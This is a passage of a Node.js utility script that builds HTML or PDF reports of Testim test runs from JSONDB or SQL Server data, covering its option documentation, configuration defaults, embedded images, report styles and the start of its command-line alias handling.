/**
 *  Testim Test Result Report Generate
 *  
 *      Generate Detailed HTML/PDF Test Report(s) with optional screenshots
 *  
 *  Options
 *  
 *      resultIdsQuery : JSONDB, SQLServer SQL query or Array of ResultIDs for report generation
 *                               JSONDBFS Example:  { "TestID": "KWvnxBA0fJ5YjACj" "TestStatus": "FAILED" } 
 *                               SQLServer Example: Select Top 3 [ResultID] from [TestData].[dbo].[TestResults] where [TestID] = 'KWvnxBA0fJ5YjACj'
 * 
 *      resultIds : Array of ResultIDs for report generation
 *                               ResultIDs Example: ["qqeHW8hPJtsvkYnx", "2Ue9yRAvZNd6GPZA"];
 * 
 *      reportDataSource : Where to get result data.  Currently supported are "JSONDBFS" and "SQLServer" (Default = "JSONDBFS")
 * 
 *      generatePDF [optional]   : true/false (default = false)
 * 
 *      openReport [optional]    : true/false (default = false)
 * 
 *      emailReport [optional]   : true/false (default = false)
 * 
 *      hiddenParams [optional] : Array of Testim variable to hide.  Values are replaced with '********' 
 *                          Example: ['password']
 * 
 *      enableGroups [optional]  : true/false (default = true) - Display steps nested in groups as applicable
 * 
 *      includeTestResults [optional]  : true/false (default = true) - Include Test Results in report
 * 
 *      includeScreenShots [optional]  : true/false (default = false) - If available, include screenshots in report
 * 
 *          If including screenshots then one of the following is required:
 * 
 *              testimToken [optional] : Token used to get screenshots.  
 *                                  Can be retrieved from Project Settings => CLI example
 * 
 *              accessToken [optional] : Token used get screenshots.  
 *                                  Can be retrieved by parsing the URL from the Download Screenshots step menu item
 * 
 *              accessTokenURL [optional] : URL containing accessToken to get screenshots.
 *                                  Can be retrieved by copying the entire URL from the Download Screenshots step menu item

 *      includeTestData [optional]  : true/false (default = false) - If available, test variables as of end of test will be included in report
 * 
 *      includeNetworkRequestStats [optional]  : true/false (default = false) - If available, network statistics will be included in report
 * 
 *      includeStepDetails [optional]  : true/false (default = true) - Include test steps in report
 *
 *      reportEmailToAddresses : Email recipients for a report
 * 
 *      reportEmailFromAddresses : Email from address for a report
 * 
 *      reportColumns [optional] : Array of columns to display in step display 
 *                     Example: ["StepNumber", "StepName", "StepType", "StepTime", "ElapsedTime", "Duration", "Status", "PageURL", "ScreenShot"]
 * 
 *  Configuration (All are optional)
 * 
 *      reportFileDirectory : Path to folder location to place report files. (Default = Current Directory + "\\TestimReports")
 * 
 *      jsondbfsPath : Path to folder location of JSONDB collection files. (Default = Current Directory + "\\TestimReports")
 * 
 *      jsondbfsCollectionName : When using JSONDBFS, this is the name of the json data file containing the result data.  (Default = "TestResults")
 * 
 *      reportStyleMarkup : HTML Style for report.  This is appended to default styles
 * 
 *      reportLogoDataUrl : Logo image as a data url
 *
 *      enableHyperlinks [optional]  : true/false - Embed links to live Testim results. (default = true)
 * 
 *      embedImages : true/false - Embed images into generated reports of keep separate in local directory. (default = true)
 *  
 *      pdfOptions: Used to tweak PDF file layout.
 *              Example { format: 'A4', scale: 0.5 }
 * 
 *      emailHost : SMTP Hostname for sending email
 *      emailUsername : SMTP username for sending email
 *      emailPassword : SMTP password for sending email
 * 
 *      sqlServerUsername : SQL Username
 *      sqlServerPassword : SQL Password
 *      sqlServerInstance : SQL Server machine/instance
 *      sqlServerDatabase : SQL Default database 
 * 
 *  Installation/Configuration
 *  
 *      If running in nodejs in VSCode you will need to install the following node modules:  
               npm i adm-zip
               npm i html-pdf-node
               npm i puppeteer-core
               npm i https
               npm i http
               npm i open
               npm i mssql
               npm i jsondbfs
               npm i nodemailer
               npm i yargs
 * 
 *      Two hook functions need to be locked and loaded for collecting test result data (Configured as After Step and After Test hooks)
 * 
 *          1) AfterStep - Extended custom action
 *          2) One of the following custom cli hook functions based on your preference for where to persist test result data.
 *              AfterTest - JOSONDBFS => Uses the filesystem to move/persist data and requires no external systems
 *              AfterTest - SQLServer => Requires a SQL Server instance to store results
 * 
 *  Notes
 * 
 *      Setting jsondbfsPath (path to JSONDB collection files)
 * 
 *          If using Testim CLI to run tests and collect results then this should be set to the directory where the Testim Agent is running.  
 *          However, should that the target directory be specified in the 'AfterTest - JOSONDBFS' then would set jsondbfsPath to match
 *
 *      To include screenshots (includeScreenShots): 
 *  
 *          To download screenshots you will need to provide your project's token.
 *          In your project settings navigate to CLI and copy the token to the token used to run tests and set "token" to this value.
 *    
 *      To include network performance data (includeNetworkRequestStats)
 * 
 *          The test case must include the custom step "Network Performance Summary" available in the git repo.
 *              https://github.com/testimio/custom-actions-examples/blob/main/testim-created/performance-testing/network-performance-summary.js
 * 
 *  Version History
 * 
 *      Version     Date            Author              Notes             
 *      1.0.0       11/01/2021      Barry Solomon       Initial Release     
 *      1.1.0       11/04/2021      Barry Solomon       Update network stats table to be scrolling with max height of 600px     
 *      1.2.0       11/08/2021      Barry Solomon       Display steps nested in groups as applicable
 *      1.3.0       11/11/2021      Barry Solomon       Add command line processing
 *      1.4.0       11/19/2021      Barry Solomon       Modify Style for PDF Generation to ignore nested scrolling of steps and network requests
 *      1.5.0       12/13/2021      Barry Solomon       Added support for regular CLI testim token to be used for screenshots
 * 
 *  Directions for Use
 * 
 *      Set configuration options reportFileDirectory and jsondbfsPath
 * 
 *      Get the ResultID of a test run with the afore mentioned hooks engaged
 * 
 *      Copy the result-id from the url in the address 
 * 
 *      Add result-id to the resultIds array
 *          or define resultIdsQuery 
 *               JSONDBFS  Example:  { "TestID": "KWvnxBA0fJ5YjACj" }; 
 *               SQLServer Example: "Select Top 3 [ResultID] from [TestData].[dbo].[TestResults] where [TestID] = 'KWvnxBA0fJ5YjACj'";
 * 
 *      Set any options and/or configurations
 * 
 *          Set the following 2
  * 
 *      Run this file and your results should show in the target or current directory.
 *          If configured and enabled, an email with the report will also be sent
 * 
 *  Disclaimer
 * 
 *      This code is provided "AS IS".  It is for instructional purposes only and is not officially supported by Testim
 * 
 **/

/* eslint-disable camelcase */
/* eslint-disable no-unused-vars */
/* eslint-disable-next-line no-redeclare */
/* globals options, configuration, Promise, require, __dirname, process */
/* eslint-disable no-prototype-builtins */

/**
 
  JSONDFBS Query: { ResultID: "cZDNoRxv4DusdNWN" }; // { "TestStatus": "FAILED" }
                  { $or: [ {ResultID: "cZDNoRxv4DusdNWN"}, {ResultID: "J7dWUCk8FGkyuTzi"} ] }
                  { "TestRunDate" : {"$regex" : "Mon Nov 01 2021"} }
                  ["cZDNoRxv4DusdNWN", "J7dWUCk8FGkyuTzi"];
  SQLServer QUERY: "Select Top 1 [ResultID] from [TestData].[dbo].[TestResults] where [TestStatus]='FAILED' order by ID desc"

**/

let options = {

    // resultIds: ["K2unEqrrKJlWS7vO"],
    // resultIdsQuery: { "TestStatus": "FAILED" },
    // resultIdsQuery: { "ResultID": "m8krl8qujkmWWnqX" },
    // resultIdsQuery: "Select Top 1 [ResultID] from [TestData].[dbo].[TestResults] where [TestStatus]='FAILED' order by ID desc",
    // reportDataSource: "JSONDBFS", // "JSONDBFS" or "SQLServer"

    // includeScreenShots: true,
    // testimToken: "",
    // accessToken: "",
    // accessTokenURL: "",

    // emailReport: true,
    // reportEmailToAddresses: "",
    // reportEmailFromAddress: "",

    // hiddenParams: ['password'],

    // generatePDF: true,
    // openReport: false,

    // includeTestData: true,
    // includeNetworkRequestStats: true,

}

let configuration = {

    // jsondbfsCollectionName: "TestResults",

    // reportFileDirectory: "C:\\Temp\\TestimReports\\",
    // jsondbfsPath: "C:\\Users\\barry\\", // "C:\\Users\\barry\\Downloads\\",

    // reportStyleMarkup: ".screenshot { width: 325px; height: 250px; padding: 10px }",
    // reportColumns: ["StepNumber", "StepName", "ElapsedTime", "Status", "PageURL", "ScreenShot"],
    // pdfOptions: undefined,
    // reportLogoDataUrl: undefined,
    // embedImages : false, 

    // emailHost: null,
    // emailUsername: null,
    // emailPassword: null,

    // sqlServerUsername: null,
    // sqlServerPassword: null,
    // sqlServerInstance: null,
    // sqlServerDatabase: null,

    // enableHyperlinks: false,
    // enableGroups: true,

}

console.log("\n================================================================================================");
console.log("                                      HTML Report Create                                        ");
console.log("================================================================================================");

const http = require('http');
const https = require('https');
const AdmZip = require('adm-zip');
const fs = require('fs');
const HtmlToPdf = require('html-pdf-node');
const open = require('open');
const nodemailer = require("nodemailer");
const { reject } = require('underscore');
const jsondbfs = require('jsondbfs');
const sql = require('mssql');
const { exit } = require('process');
const yargs = require('yargs');

let network_request_table_max_height = "600px";
let step_table_max_height = "1200px";

/* The following variables fall into more of configuration of the report system and once set will tend to be rather static
 */
const CURRENT_VERSION = "1.3.0";
const MAX_STEP_NAME_DISPLAY = 40;

const DEFAULT_REPORT_LOGO_DATA = "data:image/png;base64,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";
const DEFAULT_FOLDER_IMAGE_DATA = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAOCAMAAAAR8Wy4AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABX1BMVEXf067UqizSohTSoxXUqSrg1LTl5OTl5efl5ebl5eXk5OTxzWP21G3202zxzmPatUnf1bbh28rh28ni3M3k5OPSohP202n93Hn93Hj823fzz2LZrzTVqy3Vqy7VqizWsEDg17vk5OLSoxT20WL82W/30mT20WP10WHxylXwyVPrw0vVrz/h3Mv1zlvzzFjbrifXqR/XqSDYqiHXqB7UqSvf07HTohLwxkjbrSXxzWDTohDvwz7XqBz20mb923b82nX823X823bTog/vwTfYqBn2z1z82Gr812n812rToQ3vvy/Ypxf1zFH71Fz1zVHSohHToQvvvSbXphP1yUT70E770E3SoQ/ToAjvux7XpRD1xjj7zT/7zD/1xjfSoQ3UpyDqtxzWpAz1wyz8yjL7yTL6yTL7yjL1wyvSoAng1bTVrjrUpyHwvSP1wSP0wSPUpyLi3Mzf06/Snwjf0qz////AqMuPAAAAAWJLR0R0322obQAAAAd0SU1FB+ULCBY4ADcNWlYAAADFSURBVAjXY2BgZGJmZmJhZWPn4GDn4ORiYOTm4eXl4eMXEBQSEhIW4WQQFROXkBCXlJKWkZWVk1dQZFBSVlFVVlZT19AEAi1tHQZRXT19A0NDQyMQMDYxZTAzt7AEmgIBPNwsDFbWNrZ29vb2Do4O9vZ2tqIMTs4urm7uUODhKsrg6eXt4wsHfv4MAYFBwSGhUBASHMYQHhEZFR0DBdGxcQzxCYlJySmpKWCQlp7BkJmVnZObBwM5+QyKBYXxRRlQUJRdDADi5DTDpVfCQQAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMS0xMS0wOFQyMjo1NTo0OCswMDowMHvLcB4AAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjEtMTEtMDhUMjI6NTU6NDgrMDA6MDAKlsiiAAAAAElFTkSuQmCC";

const DEFAULT_REPORT_DATASOURCE = "JSONDBFS";
const DEFAULT_REPORT_EMAIL_TO_ADDRESS = undefined;
const DEFAULT_REPORT_EMAIL_FROM_ADDRESS = undefined;

const DEFAULT_EMAIL_HOST = undefined;
const DEFAULT_EMAIL_USER = undefined;
const DEFAULT_EMAIL_PASS = undefined;

const SQL_SERVER_USERNAME = undefined;
const SQL_SERVER_PASSWORD = undefined;
const SQL_SERVER_INSTANCE = undefined;
const SQL_SERVER_DATABASE = undefined;

const DEFAULT_REPORT_DIRECTORY = __dirname + "\\TestimReports";
const DEFAULT_JSONDBFS_PATH = __dirname + "\\TestimReports";
const DEFAULT_JSONDBFS_COLLECTIONNAME = "TestResults";

const DEFAULT_PDF_OPTIONS = { format: 'A4', scale: 0.5 } // see https://www.npmjs.com/package/html-pdf-node
const DEFAULT_REPORT_COLUMNS = ["StepNumber", "StepName", "StepType", "StepTime", "ElapsedTime", "Duration", "Status", "PageURL", "ScreenShot"];

const DEFAULT_HIDDEN_PARAMS = ['password'];

/* 

    "html { scroll-behavior: smooth; } " +

    filter: drop-shadow(16px 16px 20px red);
    filter: blur(5px);
    filter: contrast(200%);
    filter: grayscale(80%);

    clip-path: circle(40%);
    clip-path: ellipse(130px 140px at 10% 20%);
    clip-path: polygon(50% 0, 100% 50%, 50% 100%, 0 50%);
    clip-path: path('M 0 200 L 0,75 A 5,5 0,0,1 150,75 L 200 200 z');

    :is(header, main, footer) p:hover {
  color: red;
  cursor: pointer;
}
*/

const DEFAULT_REPORT_STYLE =

    "html { scroll-behavior: smooth; } " +

    ".outer-div { width: 97%; margin: 10px; padding: 5px; overflow-x: hidden; } " +

    ".test-info-label { width: 100px; } " +
    ".test-info { margin: 10px; margin-right: 25px; margin-left: auto; min-width: 627px; padding: 10px; padding-top: 20px; top: 10px; left: 140px; } " +

    ".logo { clip-path: circle(40%); position: absolute; top: 55px; left: 40px; width:100px; height:100px; filter: drop-shadow(16px 16px 20px red);} " +

    ".styled-table { border-collapse: collapse; margin: 25px 0; font-size: 0.9em; font-family: sans-serif; width: 100%; min-width: 800px; box-shadow: 0 0 20px rgba(0, 0, 0, 0.15); } " +
    ".styled-table thead tr { background-color: #4444aa; color: #ffffff; text-align: left; } " +
    ".styled-table th, .styled-table td { padding: 12px 15px; } " +
    ".styled-table tbody tr { border-bottom: thin solid #dddddd;  } " +
    ".styled-table tbody tr:nth-of-type(even) { background-color: #f3f3f3; } " +
    ".styled-table tbody tr:last-of-type { border-bottom: 2px solid #009879; } " +

    ".test-data-table thead tr { background-color: #4444aa; color: #777799; text-align: left; width: 100%; } " +
    ".test-data-table thead tr { width: 100%; background-color: #777799; color: #ffffff; text-align: left; } " +
    ".test-data-table { width: 100%; border-spacing: 0; overflow-x: hidden; } " +
    ".test-data-table tbody, .test-data-table thead tr { display: block; } " +
    ".test-data-table tbody { width: 100%; max-height: 600px; overflow-y: auto; } " +
    ".test-data-table thead th:first-child { width: 156px; } " +
    ".test-data-table tbody td:first-child { width: 156px; } " +
    ".test-data-table thead th:last-child { width: 90%; } " +
    ".test-data-table tbody td:last-child { width: 90%; } " +

    ".step-number       { min-width: 40px; } " +
    ".step-name         { min-width: 200px; } " +
    ".step-type         { min-width: 120px; } " +
    ".step-time         { min-width: 90px; } " +
    ".step-elapsed-time { min-width: 80px; } " +
    ".step-duration     { min-width: 80px; } " +
    ".step-status       { min-width: 100px; } " +
    ".step-pageurl      { min-width: 200px; } " +
    ".step-screenshot   { min-width: 200px; } " +

    ".screenshot { width: 150px; height: 100px; padding: 10px }"
    ;

/* If you want to pretty print Testim step types.  
    There are more to add.  These are just the ones I have encountered while making this
*/
const stepTypeDisplayName = {
    "action-code-step": "Custom Action",
    "click": "Click",
    "text": "Set Text",
    "extract-text": "Extract Value",
    "network-validation-step": "Network Step",
    "css-prop-validation": "Validate CSS",
    "html-attr-validation": "Validate HTML Attribute",
    "email-validation-step": "Validate Email",
    "accessibility-validation-step": "Validate Accessibility",
    "text-validation": "Validate Text",
    "random-value-generator": "Generate Random Value",
    "cli-validation-download-file": "Validate Download",
    "cli-action-code-step": "CLI Action",
}

let modalStyle = "<style>\n"
    + "#myImg:hover {opacity: 0.7;} \n"
    + ".modal { display: none; position: fixed; z-index: 1; padding-top: 100px; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.9); } \n"
    + ".modal-content { margin: auto; display: block; width: 80%; max-width: 700px; } \n"
    + "#caption { margin: auto; display: block; width: 80%; max-width: 700px; text-align: center; color: #ccc; padding: 10px 0; height: 150px; } \n"
    + ".close { position: absolute; top: 15px; right: 35px; color: #f1f1f1; font-size: 40px; font-weight: bold; transition: 0.3s; } \n"
    + ".close:hover, .close:focus { color: #bbb; text-decoration: none; cursor: pointer; } \n"

    /* Add Animation */
    + ".modal-content, #caption { -webkit-animation-name: zoom; -webkit-animation-duration: 0.05s; animation-name: zoom; animation-duration: 0.05s; }"
    + "@-webkit-keyframes zoom { from {-webkit-transform:scale(0)} to {-webkit-transform:scale(1)} }"
    + "@keyframes zoom { from {transform:scale(0)} to {transform:scale(1)} }"

    + "@media only screen and (max-width: 700px){ .modal-content { width: 100%; } } \n"
    + "</style>";

let modalScript = '<script>\n'
    + 'function _close()  { let modal = document.getElementById("myModal"); modal.style.display = "none"; } \n'
    + 'function show(img) { let modal = document.getElementById("myModal"); var modalImg = document.getElementById("img01"); var captionText = document.getElementById("caption"); modal.style.display = "block"; modalImg.src = img.src; captionText.innerHTML = img.alt; } \n'
    + '</script>';

let modalMarkup = '<div id = "myModal" class="modal" ><span class="close" onclick="_close()">&times;</span><img class="modal-content" id="img01"><div id="caption"></div></div>\n';

/**
 * Commandline parsing
 */
function parseCommandlineArgs() {

    let aliases_map = {

        // OPTIONS
        "r": "resultIds",
        "q": "resultIdsQuery",
        "pdf": "generatePDF",
        "o": "openReport",
        "open": "openReport",
        "e": "emailReport",
        "email": "emailReport",
        "token": "testimToken",
        "hidden": "hiddenParams",
        "groups": "enableGroups",
        "links": "enableHyperlinks",
        "ss": "includeScreenShots",
        "td": "includeTestData",
        "tr": "includeTestResults",
        "ns": "includeNetworkRequestStats",
        "sd": "includeStepDetails",
        "to": "reportEmailToAddresses",

        // CONFIGURATION
        "dir": "reportFileDirectory",
        "style": "reportStyleMarkup",
        "logo": "reportLogoDataUrl",
        //"": "pdfOptions",
        "ei": "embedImages",
        "columns": "reportColumns",
        "ehost": "emailHost",
        "euser": "emailUsername",
        "epass": "emailPassword",
        "from": "reportEmailFromAddresses",
        "jpath": "jsondbfsPath",
        "jcoll": "jsondbfsCollectionName",
        "suser": "sqlServerUsername",
        "spass": "sqlServerPassword",
        "shost": "sqlServerInstance",
        "sdb": "sqlServerDatabase",

    }
    let help_map = {

        // OPTIONS
